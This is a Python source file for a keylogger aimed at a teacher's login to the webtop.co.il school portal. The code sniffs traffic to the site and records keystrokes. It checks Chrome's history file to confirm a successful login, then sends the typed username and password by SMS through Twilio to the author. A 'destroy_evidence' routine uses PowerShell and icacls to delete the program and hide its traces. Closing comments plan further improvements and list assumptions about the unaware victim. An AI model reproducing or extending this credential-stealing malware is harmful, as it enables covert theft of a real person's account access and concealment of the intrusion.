from scapy.all import sniff  # packet capture module
import socket  # a module to use socket connection - for me it's used to find webtop ip
import threading  # to use both the keylogger and the packet sniffer. It's a module to run multiple parts of code at the same time
from pynput.keyboard import Listener  # to use for the keylogger- module to assist with keyboard operation
import time  # to sleep for 11 seconds while the history page refreshes - main module for time related commands
import requests  # to send the password to Twilio so that it can send an sms to me - http module in python
import sys  # another option for dealing with commands from computer, but different from os
import os  # uses the computer's system for various commands

PATH_TO_CONNECTIONS = os.environ['USERPROFILE'] + r"\Desktop\system\connections.txt"
# to find path to the connections file
INTERFACE = []
# the internet interfaces will be put in this list
caps = False
# chacking caps in keylogging
caps_lock_on = False
# checks for caps lock in keylogging
shift = False
# checks for shift in keylogging
SHORTCUT_PATH = rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk"
# to find path to the shortcut that runs the program
CMD_PATH = r"C:\Windows\System32\cmd.exe"
# path to cmd
SYSTEM_PATH = rf"{os.environ['USERPROFILE']}\Desktop\system"
# path to the system folder where the program is
STARTUP_DIRECTORY = os.getenv('PROGRAMDATA') + r'\Microsoft\Windows\Start Menu\Programs\StartUp'
# path to the startup folder where shortcut is
HISTORY_FILE_OPTIONS = [os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\History",
                        os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Profile 1\History"]
# The history file of chrome could also be in "profile 1" instead of "default" , need to check for both
# The possible paths for the history file

FULL_URL = 'www.webtop.co.il/v2/default.aspx'
# the url for webtop once a user logs in
GOT_IN_AFTER_INCORRECT_TRY = 'www.webtop.co.il/v2/default.aspx?loginFailure=1&autoLoad=alert'
# a url for the chance that the user fails then succeeds to login into webtop
INCORRECT_LOGIN_URL = 'www.webtop.co.il/v2/default.aspx?loginFailure=1'
# url for an incorrect login to webtop
LIST_OF_SPECIALS = ["Key.caps_lock", "Key.shift", "Key.ctrl_l", "Key.cmd", "Key.alt_l",
                    "Key.alt_r", "Key.menu", "Key.left", "Key.down", "Key.right", "Key.up", "Key.insert",
                    "Key.delete", "Key.print_screen", "Key.home", "Key.end", "Key.page_up", "Key.page_down",
                    "Key.num_lock", "Key.f5", "Key.esc"]
# list for special keys on the keyboard
username_and_password = ""
# where the username and password are stored

special_numbers = {"1": "!", "2": "@", "3": "#", "4": "$",
                   "5": "%", "6": "^", "7": "&", "8": "*",
                   "9": "(", "0": ")", "=": "+", "-": "_", "/": "?", ",": "<", ".": ">"}


# Special symbols that can only be achieved with shift letter

def on_press(key):
    """ When a key is being pressed, check if it is shift or caps lock. If so, change caps"""
    if str(key) == "Key.caps_lock" or str(key) == "Key.shift":
        change_caps(key)


def add_comma():
    """function mainly to separate the username and password if victim tabs between the username and password"""
    global username_and_password
    username_and_password += ","


def on_release(key):
    """ When a key is being released, check if you should add it to the message, ignore it or change the caps"""
    global shift
    global caps
    global LIST_OF_SPECIALS
    if str(key) == "Key.shift":
        change_caps(key)
    elif str(key) in LIST_OF_SPECIALS:
        pass
    elif str(key) == "Key.backspace":
        delete_letter()
    elif str(key) == "Key.enter":
        make_newline()
    elif str(key) == "Key.tab":
        add_comma()
    else:
        add_password(key)


def make_newline():
    """ Makes a new line if the user hit the enter """
    global username_and_password
    username_and_password = username_and_password + "\n"


def delete_letter():
    """ Deletes a character if the user hit the backspace"""
    global username_and_password
    username_and_password = username_and_password[0:-1]


def add_password(key):
    """Adds the letter to the username and password"""
    global caps
    global shift
    global special_numbers
    global username_and_password
    if str(key).replace("'", "") in special_numbers and shift:
        username_and_password += special_numbers[str(key).replace("'", "")]
    else:
        if str(key) == "Key.space":
            letter = " "
        else:
            letter = str(key).replace("'", '')
        if caps:
            username_and_password += letter.upper()
        else:
            username_and_password += letter


def run_keylogger():
    """Starts the keylogger"""
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def change_caps(key):
    """ function to tell the program if it should store uppercase or lowercase"""
    global shift
    global caps
    global caps_lock_on
    if str(key) == "Key.caps_lock":
        if not caps:
            caps = True
        else:
            caps = False
    if str(key) == "Key.shift":
        if shift:
            shift = False
            caps = False
        else:
            caps = True
            shift = True
    return


def check_history():
    """Checks if the url of webtop once you log in is in the history file,
     returns True if in the file and False otherwise"""
    global HISTORY_FILE_OPTIONS
    global FULL_URL
    global GOT_IN_AFTER_INCORRECT_TRY
    global INCORRECT_LOGIN_URL

    time.sleep(11)
    file = ""
    # It takes 11 seconds for history page to update
    for x in HISTORY_FILE_OPTIONS:
        try:
            file = open(x, 'r', encoding='latin-1')
        except FileNotFoundError as e:
            pass
    read = file.read()
    if FULL_URL in read and INCORRECT_LOGIN_URL not in read and "Webtop" in read or (
            GOT_IN_AFTER_INCORRECT_TRY in read) and "Webtop" in read:
        return True
    else:
        return False


def send_sms():
    """Sends a request to Twilio through the requests package of python to send an SMS to me. """
    """By using the requests package, the function sends a post request to Twilio which sends an sms to me with the 
    info of the password"""
    global username_and_password

    account_sid = "YOUR_ACOUNT_SID"
    # os.environ['ACCOUNT_SID']
    authentication_token = "YOUR_ACCOUNT_TOKEN"
    sender_number = "YOUR TWILIO NUMBER"
    # os.environ['AUTH_TOKEN']
    receiver_number = "PHONE NUMBER"
    # os.environ['MY_PHONE_NUMBER']
    # client = Client(account_sid, authentication_token)
    response = requests.post(
        f'https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Messages.json',
        auth=(account_sid, authentication_token),
        data={
            "From": sender_number,
            "To": receiver_number,
            "Body": username_and_password
        })


def check_internet_sources():
    """  Check for the source of the internet connection to sniff through those. Using the txt file that contains
    the connections and their status that was checked before the program starts.
      The function will return the names of the sources of network active"""
    global INTERFACE
    global PATH_TO_CONNECTIONS
    file = open(PATH_TO_CONNECTIONS, 'r', encoding='utf-16')
    for line in file:
        line = line.strip()
        if line[-1] == "2" and line[-2] == " ":
            line = line[:-1]
            line = line.strip()
            INTERFACE.append(line)


def destroy_evidence():
    global PATH_TO_CONNECTIONS
    global SYSTEM_PATH
    global SHORTCUT_PATH
    global CMD_PATH
    """This function will restore all the settings before the download of the program,
     and create a shortcut that will delete everything from the hack"""
    os.remove(rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk")
    create_shortcut = rf'''powershell Set-Variable -Name 'file_location' -Value '"{SHORTCUT_PATH}"'; $WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut($file_location);$Shortcut.TargetPath = '{CMD_PATH}'; $Shortcut.Arguments = '"/min /c rmdir /Q /S """{SYSTEM_PATH}""" && Del /Q ""{SHORTCUT_PATH}"""'; $Shortcut.Save();'''
    os.system(create_shortcut)
    os.system(f'icacls "{STARTUP_DIRECTORY}" /reset /t')


def main():
    """Starts the sniffing,starts the keylogger in run_keylogger and checks if user logged in by
     calling the check_history() function, logs the keylogger in log() function and exits code if they are."""
    global INTERFACE
    check_internet_sources()
    print('start')
    addr1 = socket.gethostbyname('webtop.co.il')
    sniff(iface=INTERFACE, filter=f"host {addr1}", count=1)
    tracker = threading.Thread(target=run_keylogger, daemon=True)
    tracker.setDaemon(True)
    tracker.start()

    while 1:
        sniff(iface=INTERFACE, filter=f"host {addr1}", count=1)
        logged_in = check_history()
        if logged_in:
            send_sms()
            destroy_evidence()
            sys.exit()
        else:
            pass


if __name__ == "__main__":
    main()

# Further continue the program beyond product:

# 1) Make the keylogger deal with the shift after the victim entered username and password
# It is slightly too slow now and can slightly miss Changes in shift and check generally for bugs

# 2) In the log of keylogger, every time the mouse is clicked, go to new line
# Need to think if this will not make things messier and if so fix that


# 3) Check for bugs in general

# 4) Add for keylogger delete button that erases key after the cursor

# 5) Add a function that checks if the variable is close to reaching the max amount for a string (or for SMS),
# then puts it in a txt

# 6) Add a way to separate the username and password if user hits the shift button


# ASSUMPTIONS:
# Assuming that the teacher is not aware of history file and will not delete it right before the program starts
# Works only on windows
# Currently works only for webtop, though it can be changed slightly to find different websites.
# Works only on google chrome so far (could be changed to work on other applications that save the history in a file -
# Not in incognito mode for chrome
# The internet connection has to stay the same for the attack (or until the computer shuts down or restarts)
